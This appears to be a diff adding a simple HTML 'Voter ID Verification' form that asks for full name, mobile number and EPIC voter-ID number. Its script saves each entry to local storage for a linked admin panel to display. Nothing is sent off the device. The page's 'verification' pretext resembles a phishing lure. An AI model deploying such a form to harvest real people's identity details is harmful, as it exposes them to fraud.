@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Voter ID Verification Form</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #0056b3;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .form-container {
+            background: #ffffff;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 450px;
+        }
+
+        .form-container h2 {
+            text-align: center;
+            margin-bottom: 25px;
+            color: #0056b3;
+            font-size: 24px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 15px;
+            transition: border-color 0.3s;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #0056b3;
+            box-shadow: 0 0 5px rgba(0, 86, 179, 0.3);
+        }
+
+        .btn-next {
+            width: 100%;
+            padding: 12px;
+            background: #0056b3;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+            margin-top: 10px;
+        }
+
+        .btn-next:hover {
+            background: #004085;
+        }
+
+        .success-msg {
+            background: #d4edda;
+            color: #155724;
+            padding: 10px;
+            border-radius: 6px;
+            margin-bottom: 15px;
+            text-align: center;
+            font-size: 14px;
+            display: none;
+        }
+
+        .admin-link {
+            text-align: center;
+            margin-top: 15px;
+        }
+
+        .admin-link a {
+            color: #0056b3;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .admin-link a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="form-container">
+        <h2>Voter ID Details</h2>
+        <div id="successMessage" class="success-msg">Data saved successfully!</div>
+        
+        <form id="voterForm">
+            <div class="form-group">
+                <label for="fullname">Enter Your Full Name (as per your Voter ID card)</label>
+                <input type="text" id="fullname" name="fullname" placeholder="Enter your full name" required>
+            </div>
+
+            <div class="form-group">
+                <label for="mobile">Enter Your Mobile Number</label>
+                <input type="tel" id="mobile" name="mobile" placeholder="Enter 10-digit mobile number" pattern="[0-9]{10}" required>
+            </div>
+
+            <div class="form-group">
+                <label for="epic">Enter Your EPIC Number</label>
+                <input type="text" id="epic" name="epic" placeholder="Enter EPIC number" required>
+            </div>
+
+            <button type="submit" class="btn-next">Next</button>
+        </form>
+
+        <div class="admin-link">
+            <a href="admin.html" target="_blank">Go to Admin Panel</a>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('voterForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const fullname = document.getElementById('fullname').value;
+            const mobile = document.getElementById('mobile').value;
+            const epic = document.getElementById('epic').value;
+            const time = new Date().toLocaleString();
+
+            // डेटा को ब्राउज़र के लोकल स्टोरेज में सेव करना ताकि एडमिन पैनल में दिखे
+            let submissions = JSON.parse(localStorage.getItem('voterSubmissions')) || [];
+            submissions.push({ fullname, mobile, epic, time });
+            localStorage.setItem('voterSubmissions', JSON.stringify(submissions));
+
+            // सक्सेस मैसेज दिखाना
+            document.getElementById('successMessage').style.display = 'block';
+            this.reset();
+            
+            setTimeout(() => {
+                document.getElementById('successMessage').style.display = 'none';
+            }, 3000);
+        });
+    </script>
+
+</body>
+</html>
